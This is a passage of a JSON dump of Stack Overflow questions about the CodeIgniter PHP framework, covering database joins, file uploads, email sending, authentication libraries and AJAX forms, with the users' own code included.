$this-&gt;fpdf-&gt;SetFont('Arial','',8);\n            $data = $this-&gt;fpdf-&gt;Cell(80);\n            $data = $this-&gt;fpdf-&gt;Cell(0,0,$content,0,1,'R');\n            $data = $this-&gt;fpdf-&gt;Output();\n    }\n</code></pre>\n\n<p><strong>The JSON Response</strong></p>\n\n<pre><code>%PDF-1.3\n3 0 obj\n&lt;&lt;/Type /Page\n/Parent 1 0 R\n/Resources 2 0 R\n/Contents 4 0 R&gt;&gt;\nendobj\n4 0 obj\n&lt;&lt;/Filter /FlateDecode /Length 72&gt;&gt;\nstream\nx�3R��2�35W(�r\nQ�w3T��30PISp\n��陛)X��(��(hx����+���i*�d�����F\nendstream\nendobj\n1 0 obj\n&lt;&lt;/Type /Pages\n/Kids [3 0 R ]\n/Count 1\n/MediaBox [0 0 595.28 841.89]\n&gt;&gt;\nendobj\n5 0 obj\n&lt;&lt;/Type /Font\n/BaseFont /Helvetica\n/Subtype /Type1\n/Encoding /WinAnsiEncoding\n&gt;&gt;\nendobj\n2 0 obj\n&lt;&lt;\n/ProcSet [/PDF /Text /ImageB /ImageC /ImageI]\n/Font &lt;&lt;\n/F1 5 0 R\n&gt;&gt;\n/XObject &lt;&lt;\n&gt;&gt;\n&gt;&gt;\nendobj\n6 0 obj\n&lt;&lt;\n/Producer (FPDF 1.7)\n/CreationDate (D:20120309201958)\n&gt;&gt;\nendobj\n7 0 obj\n&lt;&lt;\n/Type /Catalog\n/Pages 1 0 R\n&gt;&gt;\nendobj\nxref\n0 8\n0000000000 65535 f \n0000000228 00000 n \n0000000411 00000 n \n0000000009 00000 n \n0000000087 00000 n \n0000000315 00000 n \n0000000515 00000 n \n0000000590 00000 n \ntrailer\n&lt;&lt;\n/Size 8\n/Root 7 0 R\n/Info 6 0 R\n&gt;&gt;\nstartxref\n639\n%%EOF\n\"\"\n</code></pre>\n"},{"tags":["php","mysql","codeigniter","join","where-clause"],"answer_count":2,"favorite_count":0,"up_vote_count":0,"down_vote_count":0,"view_count":45,"score":0,"question_id":13180935,"title":"Join across multiple tables using values from joined tables","body":"<p>I have the follow tables:</p>\n\n<pre><code>systems\n-----------\nid\nname\nprice\nonline\nproductid\n\n\nspecifications\n-------------\nid\nsystemid\ntype\ncomponentid\nquantity\n\n\ncomponents\n-------------\nid\nname\nbrand\ntype\ndescription\n</code></pre>\n\n<p>I need to filter across these tables with multiple options. Each system has multiple specifications rows, and each 'specifications' row links to it's corresponding 'components' row. </p>\n\n<p>My issue is this: </p>\n\n<p>I need to be able to filter systems by multiple properties based on the table joins. I've been using code that'll allow me 1 search option, but nothing further:</p>\n\n<pre><code>select\n    `systems`.`id`,\n    `systems`.`name`, \n    `specifications`.`type` \nfrom `systems` \n    join specifications \n        on `systems`.`id` = `specifications`.`systemid` \n    join components \n        on `specifications`.`componentid` = `components`.`id`\nwhere \n    `specifications`.`type` = 'cpu' \n    and `components`.`brand` = 'amd'\n</code></pre>\n\n<p>So, that'll let me do a join where the specifications type is CPU and the brand is AMD, but if I add something else to look for too, like <code>specifications.type ='graphics' AND components.brand = 'nvidia'</code> it just doesn't work. I think this is inherent in the way joins work, as I've said, I'm having trouble articulating the issue here as I'm quite new to these more complex database transactions and would greatly appreciate being pointed in the right direction!</p>\n\n<p>I'm using CodeIgniter as my framework, and I'd like to try and get the bottom of this via MySQL as opposed to doing it in PHP if it's possible - as I'd like a better understanding of what's going on here.</p>\n"},{"tags":["php","codeigniter"],"answer_count":0,"favorite_count":0,"up_vote_count":1,"down_vote_count":0,"view_count":35,"score":1,"question_id":13182416,"title":"How to write an img path to MySQL using the file Uploader class and user model","body":"<p>I'm trying to add a final field to my project that contains a URL of the files that have been uploaded, if anyone could point me in the write direction for extending my model ?\nI have included my codeIgniter Model &amp; Controller code.</p>\n\n<p>controller:</p>\n\n<pre><code>class Canvas extends CI_Controller {\n   function __construct() {\n    parent::__construct();\n                  $this-&gt;load-&gt;helper(array('form', 'url'));\n\n}\n\nfunction index() {\n            $vars = array();\n            //$this-&gt;load-&gt;library('ChromePhp');\n            //$this-&gt;ChromePhp-&gt;log('test');     \n            //$this-&gt;ChromePhp-&gt;log($_SERVER);\n\n            // using labels\n           // foreach ($_SERVER as $key =&gt; $value) {\n             //   $this-&gt;ChromePhp-&gt;log($key, $value);\n          //  }\n            // warnings and errors\n            //$this-&gt;ChromePhp-&gt;warn('this is a warning');\n            //$this-&gt;ChromePhp-&gt;error('this is an error');\n            $this-&gt;load-&gt;library('FacebookConnect');\n            $facebook=$this-&gt;facebookconnect-&gt;connect();\n            $vars['facebook'] = $facebook;\n            $user = $vars['user'] = $facebook-&gt;getUser();\n            $this-&gt;load-&gt;model('Users_Model');\n            // user already set up. Show thank you page\n            if($user != 0  &amp;&amp; sizeof($_POST)&gt;0) {\n                $this-&gt;do_upload();\n                $this-&gt;iterate_profile ($vars['user'],false,$_POST);\n                $this-&gt;load-&gt;view('canvas',$vars);\n            } else {\n            // user not set, show welcome message\n                $this-&gt;load-&gt;view('canvas',$vars);\n            }\n\n}\n    function do_upload()\n    {\n        $config['upload_path'] = './uploads/';\n        $config['allowed_types'] = 'gif|jpg|png';\n        $config['max_size'] = '20048';\n        $config['max_width']  = '10624';\n        $config['max_height']  = '10268';\n        $config['file_name']  = date(\"Y_m_d H:i:s\");\n\n        $this-&gt;load-&gt;library('upload', $config);\n\n        if ( ! $this-&gt;upload-&gt;do_upload())\n        {\n            $error = array('error' =&gt; $this-&gt;upload-&gt;display_errors());\n\n        }\n        else\n        {\n            $data = array('upload_data' =&gt; $this-&gt;upload-&gt;data());\n\n            $this-&gt;load-&gt;view('upload_success', $data);\n        }\n    }\n\n    function thank_you() {\n            $this-&gt;load-&gt;view('thank_you',$vars);\n    }\n\n    function remove() {\n            $vars = array();\n            $this-&gt;load-&gt;library('FacebookConnect');\n            $facebook=$this-&gt;facebookconnect-&gt;connect();\n            $vars['facebook'] = $facebook;\n            $vars['user'] = $facebook-&gt;getUser();\n            $this-&gt;load-&gt;model('Users_Model'); \n            if($vars['user'] == 0) {\n                // user not set, redirect\n                redirect('/', 'refresh');\n            } else {\n                // user already set up. Remove\n                $this-&gt;load-&gt;model('Users_Model'); \n                $this-&gt;Users_Model-&gt;remove($vars['user']);\n            }\n\n            $this-&gt;load-&gt;view('removed',$vars);\n    }\n\n    protected function iterate_profile ($user,$breadcrumb,$item) {\n\n        foreach($item as $key =&gt; $value) {\n            if(is_array($value)) {\n                $this-&gt;iterate_profile($user,$key,$value);\n            }\n            else {\n                if($breadcrumb) {\n                    //echo '[' . $breadcrumb . '_' . $key . ']= ' . $value . ' &lt;br /&gt;';\n                    $key = $breadcrumb . '_' . $key;\n                }\n\n                if( ! $this-&gt;Users_Model-&gt;exists($user,$key)) {\n                    // does not exist in the database, insert it\n                    $this-&gt;Users_Model-&gt;add($user,$key,$value);\n                } else {\n                    $this-&gt;Users_Model-&gt;update($user,$key,$value);\n                }\n            }\n        }\n    } \n\n\n}\n</code></pre>\n\n<p>Model:</p>\n\n<pre><code>class Users_Model extends CI_Model {\n\nprotected $_name = 'users';\n\nfunction add($id,$key,$value) {\n    $data = array(\n       'id' =&gt; $id,\n       'name' =&gt; $key,\n       'value' =&gt; $value\n    );\n\n    return $this-&gt;db-&gt;insert($this-&gt;_name, $data); \n}\nfunction update($id,$key,$value) {\n    $data = array(\n       'value' =&gt; $value\n    );\n\n    $this-&gt;db-&gt;where(array(\n       'id' =&gt; $id,\n       'name' =&gt; $key\n    ));\n    return $this-&gt;db-&gt;update($this-&gt;_name, $data); \n}\n\nfunction exists($id,$key=null) {\n    if($key == null) {\n        $this-&gt;db-&gt;where(array(\n        'id' =&gt; $id\n        ));\n    } else {\n        $this-&gt;db-&gt;where(array(\n        'id' =&gt; $id,\n        'name' =&gt; $key\n        ));  \n    }\n\n    $query = $this-&gt;db-&gt;get($this-&gt;_name);\n    if($query-&gt;num_rows() &gt; 0) {\n        return true;\n    }\n    return false;\n}\n\nfunction remove($id) {\n    $data = array(\n       'id' =&gt; $id,\n    );\n\n    return $this-&gt;db-&gt;delete($this-&gt;_name, $data); \n}\n\nfunction all() {\n    $query = $this-&gt;db-&gt;get($this-&gt;_name);\n    $results = array();\n    if($query-&gt;num_rows() &gt; 0) {\n        foreach($query-&gt;result() as $row) {\n            $results[]=$row;\n        }\n    } \n    return $results;  \n}\n\n\n}\n</code></pre>\n"},{"tags":["php","email","codeigniter","error-logging"],"answer_count":5,"favorite_count":9,"up_vote_count":8,"down_vote_count":0,"view_count":3865,"score":8,"question_id":260597,"title":"In CodeIgniter, How Can I Have PHP Error Messages Emailed to Me?","body":"<p>I'd like to receive error logs via email. For example, if a <code>Warning-level</code> error message should occur, I'd like to get an email about it.</p>\n\n<p>How can I get that working in CodeIgniter?</p>\n"},{"tags":["php","codeigniter","codeigniter-2"],"answer_count":1,"favorite_count":1,"up_vote_count":0,"down_vote_count":0,"view_count":39,"score":0,"question_id":13179838,"title":"CI Controller not getting loaded","body":"<p>I have a site using CI version 2.1.3 running on a xampp install locally. The code has been put in a git repository.<br />\nI cloned the code into a directory on another machine (also running xammp install with identical paths).</p>\n\n<p>Now on the 'other machine' it refuses to load the CI_Controoler class, giving the error message;<br /></p>\n\n<pre><code>Fatal error: Class 'CI_Controller' not found in C:\\dev\\www\\my_site\\system\\core\\CodeIgniter.php on line 244\n</code></pre>\n\n<p>I have added some code to system/core/Codeigniter to check what is going on. This is...</p>\n\n<pre><code>// Load the base controller class\nrequire BASEPATH.'core/Controller.php';\n\nfunction &amp;get_instance()\n{\n        if (file_exists(BASEPATH.'core/Controller.php')) {\n            echo 'file exists&lt;br /&gt;';\n            if (class_exists('CI_Controller')) {\n                echo 'class exists&lt;br /&gt;';\n            } else {\n                echo 'no class&lt;br /&gt;';\n            }\n        } else {\n            echo 'no file found&lt;br /&gt;';\n        }\n\n    return CI_Controller::get_instance();\n}\n</code></pre>\n\n<p>The resulting output is...</p>\n\n<pre><code>file exists\nno class\n\nFatal error: Class 'CI_Controller' not found in C:\\dev\\www\\my_site\\system\\core\\CodeIgniter.php on line 244\n</code></pre>\n\n<p>So it is finding the class, but not loading it, any ideas why??</p>\n"},{"tags":["codeigniter"],"answer_count":1,"favorite_count":1,"up_vote_count":10,"down_vote_count":0,"view_count":10588,"score":10,"question_id":1985967,"title":"CodeIgniter activerecord, retrieve last insert id?","body":"<p>Are there any options to get the last insert id of a new record in CodeIgniter?</p>\n\n<pre><code>$last_id = $this-&gt;db-&gt;insert('tablename',\n                                array('firstcolumn' =&gt; 'value',\n                                      'secondcolumn' =&gt; 'value')\n                            );\n</code></pre>\n\n<p>Considering the table consits of fields id (autoincrement) firstcolumn and secondcolumn.</p>\n\n<p>This way you can use the insert id in the following code.</p>\n"},{"tags":["arrays","codeigniter","drop-down-menu","populate"],"answer_count":1,"favorite_count":0,"up_vote_count":1,"down_vote_count":0,"view_count":18,"score":1,"question_id":13178641,"title":"Codeigniter: repopulate dropdowns array using set_value","body":"<p>I have this piece of code:</p>\n\n<pre><code>&lt;?php for ( $i=1; $i&lt;=9; $i++ ) : ?&gt;\n  &lt;select name=\"codes[]\"&gt;\n    &lt;?php foreach ( $errors as $error ) : ?&gt;\n    &lt;option value=\"&lt;?=$error-&gt;code?&gt;\" &lt;?=set_select( 'codes', $error-&gt;code )?&gt;&gt;&lt;?=$error-&gt;fault?&gt;&lt;/option&gt;\n    &lt;?php endforeach; ?&gt;\n  &lt;/select&gt;\n&lt;?php endfor; ?&gt;\n</code></pre>\n\n<p>The set_select part doesn't seem to work well, even though I added the validation rule in my controller:</p>\n\n<pre><code>$this-&gt;form_validation-&gt;set_rules( 'codes', '', '' );\n</code></pre>\n\n<p>After submitting the form, all dropdowns get the last dropdown's selected value.</p>\n\n<p>Any idea how I could fix this? The user guide doesn't give details about this specific situation.</p>\n\n<p>Thank you.</p>\n"},{"tags":["php","sql","sql-server","codeigniter"],"answer_count":1,"favorite_count":0,"up_vote_count":0,"down_vote_count":0,"view_count":35,"score":0,"question_id":13176624,"title":"SQL Comment in CodeIgniter Active Record?","body":"<p>I'm moving a project to CodeIgniter and want to take advantage of Active Record.  However, I haven't found a way to append a SQL comment to the queries.  In the existing code the query looks something like this:</p>\n\n<pre><code>UPDATE table\nSET column = 'value'\nWHERE  ID = passed value;\n-- Transacted by ' .$_SESSION['Name']\n</code></pre>\n\n<p>I've search Google and SO and not found the answer to how to add that last \"Transacted by\" comment without coding the whole thing directly and using <code>$this-&gt;db-&gt;query('.....')</code></p>\n"},{"tags":["php","codeigniter","tankauth"],"answer_count":1,"favorite_count":0,"up_vote_count":1,"down_vote_count":0,"view_count":23,"score":1,"question_id":13176761,"title":"Codeigniter Tank Auth - removing 'index.php' from config leads to endless loop","body":"<p>I've installed a base install of the <strong>Tank Auth</strong> authentication library for Codeigniter from here: <a href=\"https://github.com/ericbae/XTA2/\" rel=\"nofollow\">https://github.com/ericbae/XTA2/</a></p>\n\n<p>Everything works well, until I remove 'index.php' from my config.php file:</p>\n\n<p><code>$config['index_page'] = '';</code><br/>\n<code>$config['enable_query_strings'] = FALSE;</code></p>\n\n<p>Now my browser goes into an endless redirect loop, and tells me: </p>\n\n<blockquote>\n  <p>Firefox has detected that the server is redirecting the request for\n  this address in a way that will never complete.</p>\n</blockquote>\n\n<p>Firebug looks like this:</p>\n\n<p><img src=\"http://i.stack.imgur.com/pxcR1.png\" alt=\"enter image description here\"></p>\n\n<p>and my htaccess file looks like this:</p>\n\n<pre><code>Options +FollowSymLinks All -Indexes\n\n&lt;IfModule mod_rewrite.c&gt;\n    RewriteEngine On\n    RewriteBase /path/to/my/site/\n\n    RewriteCond %{REQUEST_URI} ^system.*\n    RewriteRule ^(.*)$ index.php?/$1 [L]\n\n    RewriteCond %{REQUEST_URI} ^application.*\n    RewriteRule ^(.*)$ index.php?/$1 [L]\n\n    RewriteCond %{REQUEST_FILENAME} !-f\n    RewriteCond %{REQUEST_FILENAME} !-d\n    RewriteRule ^(.*)$ index.php?/$1 [L]\n&lt;/IfModule&gt;\n\n&lt;IfModule !mod_rewrite.c&gt;\n    ErrorDocument 404 index.php\n&lt;/IfModule&gt;  \n</code></pre>\n\n<p>This is the normal htaccess file which I use with many other codeigniter projects and it seems to work well with those.</p>\n\n<p><strong>What on earth could be causing this?</strong></p>\n"},{"tags":["php","codeigniter","amazon-web-services","ntp"],"answer_count":0,"favorite_count":0,"up_vote_count":0,"down_vote_count":0,"view_count":28,"score":0,"question_id":13177055,"title":"Synchronize the server clock to an NTP server","body":"<p>I want to  synchronize the server clock to an NTP server using php script, i am used Codeignator Please help</p>\n"},{"tags":["php","codeigniter","authentication","identity","ion-auth"],"answer_count":1,"favorite_count":0,"up_vote_count":0,"down_vote_count":0,"view_count":51,"score":0,"question_id":13151998,"title":"How do you use two database columns for the identity in ion auth (codeigniter library)?","body":"<p>Ion Auth allows you to choose an identity which is basically a database column to be used for login. I want to be able to choose two database columns for my identity in Ion Auth since I want users to login using either their username or email similar to how Twitter works. How do I do this? Below is a sample code of what I'm trying to accomplish:</p>\n\n<pre><code>&lt;?php\n$config['identity'] = 'email &amp;&amp; username'; // A database column which is used to login with ion auth\n?&gt;\n</code></pre>\n\n<p>As you can see, I want both usernames and emails but I don't know how to add both in the config.</p>\n"},{"tags":["facebook","codeigniter"],"answer_count":0,"favorite_count":0,"up_vote_count":0,"down_vote_count":0,"view_count":21,"score":0,"question_id":13175847,"title":"facebook url sharing of codeigniter page","body":"<p>I am using the codeigniter framework </p>\n\n<pre><code>$route['default_controller'] = \"index/index\";\n</code></pre>\n\n<p>When I put <strong>example.com/index/index</strong> to add a page link as a post,\nfacebook identifies the page title and page description and og:image if meta tag.</p>\n\n<p>The problem is that when I put <strong>example.com</strong>,\nfacebook identifies the page title and page description only.. why?</p>\n"},{"tags":["php","codeigniter"],"answer_count":0,"favorite_count":0,"up_vote_count":0,"down_vote_count":3,"view_count":34,"score":-3,"question_id":13174543,"title":"Page loading error in IE8 only","body":"<p>I have an application in codeigniter in which there is a page with pagination. After loading first page, when I click on 2nd page link the application hanging in IE 8. All other browsers has no problem.Please help me.</p>\n\n<pre><code>function Ajaxupdate(a,b,c,d)\n{   \n    if(c)\n        pageno = c.parameters.page;\n    else\n        pageno = 1;\n\n    $('current_page').value = pageno;\n\n    var ord = $('current_order').value;\n\n    var par ='page='+pageno+'&amp;';\n\n    par+='Searchclick='+searchclick+'&amp;';\n\n    par+='field='+field+'&amp;order='+ord+'&amp;';\n\n    sl= $('searchform').serialize();\n\n    sl=par+sl;\n\n    new Ajax.Updater('content','http://localhost/url',{method: 'post',onCreate:Loadimage, parameters:sl, evalScripts:true});\n\n    return false;\n}\n</code></pre>\n"},{"tags":["php","javascript","ajax","codeigniter"],"answer_count":2,"favorite_count":0,"up_vote_count":0,"down_vote_count":0,"view_count":53,"score":0,"question_id":13173007,"title":"my Codeigniter form with ajax return all page","body":"<p>In my project I user ajax to process form. Now i want to get Post data to process. I use Javascript when Jquery is not allowed. But Ajax return whole page, how can I fix that.</p>\n\n<p>My controller :</p>\n\n<pre><code>class Form extends Controller {\n\n    function __construct() {\n        parent :: __construct();\n        $this-&gt;load-&gt;model('Form_model');\n    }\n\n    function index() {\n       $this-&gt;loadForm();\n\n    }\n\n    function loadForm() {\n        $this-&gt;load-&gt;view('form_view');\n    }\n\n    function ajax_add_form_content() {\n\n        if (isset($_SERVER['HTTP_X_REQUESTED_WITH']) &amp;&amp; $_SERVER['HTTP_X_REQUESTED_WITH'] == \"XMLHttpRequest\") {\n            echo $_POST['fullname'] . '+' . $_POST['subject'];\n        } else {\n            echo '0';\n        }\n    }\n\n}\n</code></pre>\n\n<p>And my view :</p>\n\n<pre><code>&lt;html&gt;\n    &lt;head&gt;\n    &lt;meta http-equiv=\"Content-Type\" content=\"text/html; charset=utf-8\"&gt;\n    &lt;title&gt;Form view&lt;/title&gt;\n\n    &lt;script language=\"JavaScript\" type=\"text/javascript\"&gt;\n\n\n        function ajax_post(){\n\n            var hr = new XMLHttpRequest();\n\n            var url = \"&lt;?php echo base_url().'index.php/form/ajax_add_form_content'?&gt;\";\n            var fn = document.getElementById(\"txtFullName\").value;\n            var ln = document.getElementById(\"txtSubject\").value;\n            var vars = \"fullname=\"+fn+\"&amp;subject=\"+ln;\n            hr.open(\"POST\", url, true);\n\n            hr.setRequestHeader(\"Content-type\", \"application/x-www-form-urlencoded\");\n\n            hr.onreadystatechange = function() {\n                if(hr.readyState == 4 &amp;&amp; hr.status == 200) {\n                    var return_data = hr.responseText;\n                    document.getElementById(\"status\").innerHTML = return_data;\n                }\n            }\n\n            hr.send(vars); \n            document.getElementById(\"status\").innerHTML = \"processing...\";\n            return false;\n        }\n\n    &lt;/script&gt;\n\n&lt;/head&gt;\n&lt;body&gt;\n    &lt;div id=\"form\"&gt;\n        &lt;span id='status' &gt;&lt;/span&gt;\n        &lt;form class=\"form\" method=\"post\"&gt;\n            &lt;p class=\"formName\"&gt;contact&lt;/p&gt;\n            &lt;p class=\"formDesc\"&gt;contact us&lt;/p&gt;\n            &lt;div class=\"form_elements\"&gt;\n                &lt;div class=\"textField\"&gt;\n                    &lt;label&gt;Full name&lt;/label&gt;\n                    &lt;input id=\"txtFullName\" class=\"inputText required\" type=\"text\" maxlength=\"255\" size=\"28\" name=\"txtFullName\"&gt;\n\n\n                &lt;/div&gt;\n\n                &lt;div class=\"textField\"&gt;\n                    &lt;label&gt;Subject&lt;/label&gt;\n                    &lt;input id=\"txtSubject\" class=\"inputText required\" type=\"text\" maxlength=\"255\" size=\"28\" name=\"txtSubject\"&gt;\n\n\n                &lt;/div&gt;\n\n            &lt;/div&gt;\n            &lt;div class=\"form_submit\"&gt;\n                &lt;input id=\"btnSubmit\" type=\"submit\" value=\"Send\" name=\"btnSubmit\" onClick=\"javascript:ajax_post();\"&gt;\n            &lt;/div&gt;\n        &lt;/form&gt;\n        &lt;div id='display'&gt;\n        &lt;/div&gt;\n\n    &lt;/div&gt;\n&lt;/div&gt;\n&lt;/body&gt;\n&lt;/html&gt;\n</code></pre>\n\n<p>Thanks for any help !</p>\n"},{"tags":["php","codeigniter"],"answer_count":2,"favorite_count":1,"up_vote_count":2,"down_vote_count":0,"view_count":31,"score":2,"question_id":13172204,"title":"how pass base64encode characters in codeigniter url?","body":"<p>I have URL like this <code>http://domain/home/activate/MzU=</code> .the parameter</p>\n\n<pre><code> \"MzU=\" = base64encode($data)\n</code></pre>\n\n<p>I cant open this URL with this parameter.\nError like this!<code>\"The URI you submitted has disallowed characters.\"</code>\nHow can i pass base64encode characters in codeigniter url?</p>\n"},{"tags":["apache","codeigniter","image-processing","imagemagick"],"answer_count":0,"favorite_count":0,"up_vote_count":0,"down_vote_count":0,"view_count":24,"score":0,"question_id":13173152,"title":"Codeigniter Image Manipulation Class process overhead","body":"<p>in Codeigniter's Image Manipulation Class there's a preference called 'library_path' where you have to mention the path to the binary. this means its executing the binary. Does this take more ram than using the apache extension ?</p>\n\n<p>is there a less process intensive class or a method that can be used with CI?</p>\n"},{"tags":["php","codeigniter"],"answer_count":1,"favorite_count":0,"up_vote_count":0,"down_vote_count":0,"view_count":31,"score":0,"question_id":13172744,"title":"How to override validation error messages for file upload class in CI?","body":"<p>I have a form which has max size limit for attachment when user tries to upload is 10MB ( in my Case). When i try to upload more than that CI redirecting to the form with error message \"select a file to upload\". But i want error message like this \"upload a file which is lesser size than 10MB\". How should i over write that error message.</p>\n\n<p>Note: I am using CodeIgniter file upload class entirely..........</p>\n"},{"tags":["php","codeigniter"],"answer_count":1,"favorite_count":0,"up_vote_count":0,"down_vote_count":0,"view_count":27,"score":0,"question_id":13171711,"title":"Why i am not able to pass email id to TO filed while sending email using CI?","body":"<p>Hi this is my controller function. In my view i set one email variable coming from database into session data. I verified it  in controller whether i am getting it correct it or not. I am getting it perfectly. But when i tried to send that email id as TO field variable it's not working.</p>\n\n<pre><code>function do_upload()\n{ \n    $config['upload_path'] = 'C:\\xampp\\htdocs\\upload\\application';\n    $config['allowed_types'] = 'doc|docx|pdf';\n    $config['max_size'] = '10240';\n    $email = $this-&gt;session-&gt;userdata(\"employer_email\");// If i echo $email; I will get my passed session variable\n\n    $this-&gt;load-&gt;library('upload', $config);\n\n    if ( ! $this-&gt;upload-&gt;do_upload())\n    {   \n        $error = array('error' =&gt; $this-&gt;upload-&gt;display_errors());\n\n        $this-&gt;load-&gt;view('upload_form', $error);\n    }\n    else\n    { \n        $data = array('upload_data' =&gt; $this-&gt;upload-&gt;data()); \n\n        echo \"Resume Successfully uploaded to database.............\";\n        $file = $data['upload_data']['full_path'];\n\n    $config = Array(\n      'protocol' =&gt; 'smtp',\n      'smtp_host' =&gt; 'ssl://smtp.googlemail.com',\n      'smtp_port' =&gt; 465,\n      'smtp_user' =&gt; 'xxx@gmail.com', // change it to yours\n      'smtp_pass' =&gt; 'xxxx', // change it to yours\n      'mailtype' =&gt; 'html',\n      'charset' =&gt; 'iso-8859-1',\n      'wordwrap' =&gt; TRUE\n    );\n\n\n      $this-&gt;load-&gt;library('email', $config);\n      $this-&gt;email-&gt;set_newline(\"\\r\\n\");\n      $this-&gt;email-&gt;from('xxx@gmail.com'); // change it to yours\n      $this-&gt;email-&gt;to($email); // But here it's not working\n      $this-&gt;email-&gt;subject('Email using Gmail.');\n      $this-&gt;email-&gt;message('Working fine ! !');\n      $this-&gt;email-&gt;attach($file);\n      if($this-&gt;email-&gt;send())\n     {\n      echo 'Email sent.';\n     }\n     else\n    {\n     show_error($this-&gt;email-&gt;print_debugger());\n    }\n    }\n\n\n}\n</code></pre>\n"},{"tags":["php","codeigniter"],"answer_count":3,"favorite_count":0,"up_vote_count":1,"down_vote_count":0,"view_count":33,"score":1,"question_id":13171753,"title":"Small query for logging in users with salted password","body":"<p>I have codeigniter model like this</p>\n\n<pre><code>&lt;?php\n\nclass Model_Login extends CI_Model{\n    function __construct(){\n        parent::__construct();\n    }\n\n    public function login_submit($arrayData){\n        extract($arrayData);\n        $username=clean($txtusername);\n        $password=clean($txtpassword);\n\n        //first get salt for the respective user.\n        $getsalt=$this-&gt;db-&gt;query(\"SELECT PASSWORD_SALT FROM USER_INFOS WHERE USER_NNAME=?\",array($username))-&gt;row();\n        $salt=$getsalt-&gt;PASSWORD_SALT;\n        $password=sha1($salt.$password);\n\n        $query=$this-&gt;db-&gt;query(\"SELECT * FROM USER_INFOS WHERE STATUS='Y' AND USER_NNAME=? AND USER_PASSWORD=?\",array($username,$password));\n\n        if($query-&gt;num_rows&gt;0){\n            $row=$query-&gt;row();\n            // login successfull create session\n            $this-&gt;session-&gt;set_userdata('USER_ID', $row-&gt;USER_ID);\n            $this-&gt;session-&gt;set_userdata('USER_FULL_NAME', $row-&gt;USER_ENAME);\n\n            return \"success\";\n        }else{\n            return \"Invalid username and/or password.\";\n        }\n\n\n\n\n\n    }\n}\n\n?&gt;\n</code></pre>\n\n<p>Where,\nPASSWORD_SALT, is a database field that contains 128 character long random(for each user) salt hashed using <code>hash</code> function. </p>\n\n<p>The code works perfect if <code>USERNAME</code> is unique. But i m trying to think of the client who may ask that username should not be unique. If username is not unique it always select first row and all except one having same username will not be able to login even they provide valid username and password.</p>\n\n<p>What will be better work around on this scenario?</p>\n\n<p><strong>EDIT</strong></p>\n\n<p>I know Putting <code>USERNAME</code> not unique is a bad idea. But in our country there are several websites where username is not unique (or in some case username is even  predictable). For example, I have an account in certain branch of bank whose branch code is <code>032</code>, and my name is John Smith, then the username to access their ebanking will be <code>032JOHNS</code>, there might be more than one John Smith in that branch finally having same username. And to login to their ebanking system i just need to provide this username and my password.</p>\n\n<p>Thanks</p>\n"},{"tags":["jquery","mysql","codeigniter"],"answer_count":0,"favorite_count":0,"up_vote_count":0,"down_vote_count":0,"view_count":80,"score":0,"question_id":13171536,"title":"populate data select box from jquery with mysql and codeigniter","body":"<p>I want to fill select box with jquery,\nMy Model </p>\n\n<pre><code>function fetch_unit() {\n\n  $this-&gt;db-&gt;select('id_unit, unit_name');\n  $records=$this-&gt;db-&gt;get('t_unit');\n  $data=array();\n\n\n  foreach ($records-&gt;result() as $row)\n  {\n    $data[$row-&gt;id_unit] = $row-&gt;unit_name;\n  }\n    return ($data);\n}\n</code></pre>\n\n<p>and this is my Controller </p>\n\n<pre><code>function fetch_unit() {\n    $item = $this-&gt;cdd_model-&gt;fetch_unit();        \n    echo json_encode($item);\n}\n</code></pre>\n\n<p>and this is view</p>\n\n<pre><code>&lt;div class=\"control-group\"&gt;\n          &lt;label class=\"control-label\" for=\"cmpgn_bis_unit\" &gt;Business Unit&lt;/label&gt;\n          &lt;div class=\"controls\"&gt; \n              &lt;select id=\"sUnit\" &gt;&lt;option value=\"\"&gt;Please Select&lt;/option&gt;&lt;/select&gt;\n          &lt;/div&gt;              \n        &lt;/div&gt;\n</code></pre>\n\n<p>and this is my jquery</p>\n\n<pre><code> $.post(\"&lt;?php base_url(); ?&gt;co/ctrl_cdd/fetch_unit\",   function(data) {\nvar sel = $(\"#sUnit\");\nsel.empty();\n$.each(data, function(i, item){\n    $(\"#sUnit\").append('&lt;option value=\"' + item.id_unit + '\"&gt;'+ item.unit_name + '&lt;/option&gt;');        \n})\n},\"json\");\n</code></pre>\n\n<p>when I tried it always get undefined value, can help me how to fix these code properly.\nYour help is highly appreciated.</p>\n\n<p>Thanks </p>\n"},{"tags":["codeigniter"],"answer_count":1,"favorite_count":0,"up_vote_count":0,"down_vote_count":0,"view_count":33,"score":0,"question_id":13171201,"title":"Model of Codeigniter","body":"<p>How can I use index function of model in controller ??</p>\n\n<p>As per codeigniter user guide we know we can use  </p>\n\n<pre><code>$this-&gt;name_of_model-&gt;function_of_model();    \n</code></pre>\n\n<p>in controller. In redirection we can use    </p>\n\n<pre><code>redirect('controller_name/function_name');    \n</code></pre>\n\n<p>if we use index function in controller then we can use in redirection </p>\n\n<pre><code>redirect('controller_name');\n</code></pre>\n\n<p>to redirect to that controller. In this way how can I use  </p>\n\n<pre><code>$this-&gt;name_of_model-&gt;function_of_model();\n</code></pre>\n\n<p>this syntax.</p>\n\n<p>Thanks</p>\n"},{"tags":["sqlite","codeigniter"],"answer_count":0,"favorite_count":1,"up_vote_count":0,"down_vote_count":0,"view_count":22,"score":0,"question_id":13171316,"title":"Weird behaviour with codeigniter and sqlite","body":"<p>I am using Codeigniter to fill a sqlite database with content. The problem occurs when inserting something like this: </p>\n\n<pre><code>$this-&gt;db-&gt;query(\"INSERT INTO ITEM (data) VALUES ('Foobar selected foobar')\");\n</code></pre>\n\n<p>The field \"data\" is of type \"TEXT\". If the string to insert contains the word \"select\" two rows are inserted instead of one.</p>\n\n<p>With the following statement only one row is inserted (this is the correct behaviour I was expecting): </p>\n\n<pre><code>$this-&gt;db-&gt;query(\"INSERT INTO ITEM (data) VALUES ('Foobar foobar')\");\n</code></pre>\n\n<p>Any ideas what I can do to correctly insert the first statement one time only?</p>\n"},{"tags":["php","web-services","codeigniter","amazon-s3"],"answer_count":1,"favorite_count":0,"up_vote_count":1,"down_vote_count":0,"view_count":8,"score":1,"question_id":13154513,"title":"AmazonSES not sending mail in some servers","body":"<p>In my website i used  AmazonSES for sending mail. but it works fine in abc.com and not works in xyz.com, After sending mail mail in xyz.com return true. I used same code and credentials in both server. In xyz.com send php mails successfully.   I am used codeignator.  Please help.</p>\n"},{"tags":["php","jquery","codeigniter","google-maps-api-3"],"answer_count":2,"favorite_count":1,"up_vote_count":1,"down_vote_count":0,"view_count":54,"score":1,"question_id":13170664,"title":"Place Javascript returned from server","body":"<p>I've got the following code to get some Javascript back from the server:</p>\n\n<pre><code>        $.ajax({\n            url: '&lt;?=base_url()?&gt;index.php/guide/getMap',\n            success: function(data) {\n                $('.result').text(data);\n                